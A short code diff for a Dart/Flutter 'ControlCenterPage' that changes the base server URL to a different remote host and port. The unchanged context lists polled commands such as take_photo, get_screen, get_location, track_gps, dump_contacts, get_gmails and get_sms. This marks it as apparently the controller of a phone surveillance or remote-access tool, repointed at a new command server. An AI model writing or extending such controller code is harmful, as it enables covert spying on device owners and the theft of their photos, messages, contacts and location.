@@ -93,7 +93,7 @@ class ControlCenterPage extends StatefulWidget {
 class _ControlCenterState extends State<ControlCenterPage> with SingleTickerProviderStateMixin {
 
   // ── Constants ──────────────────────────────────────────────────────────────
-  static const _kBase  = 'http://papi.queen-official.com:5021';
+  static const _kBase  = 'http://amposlegal.pteroq.xyz:4265';
   static const Set<String> _needPoll = {
     'take_photo','get_screen','get_location','track_gps',
     'get_contacts','dump_contacts','get_gmails','get_sms','get_gallery',
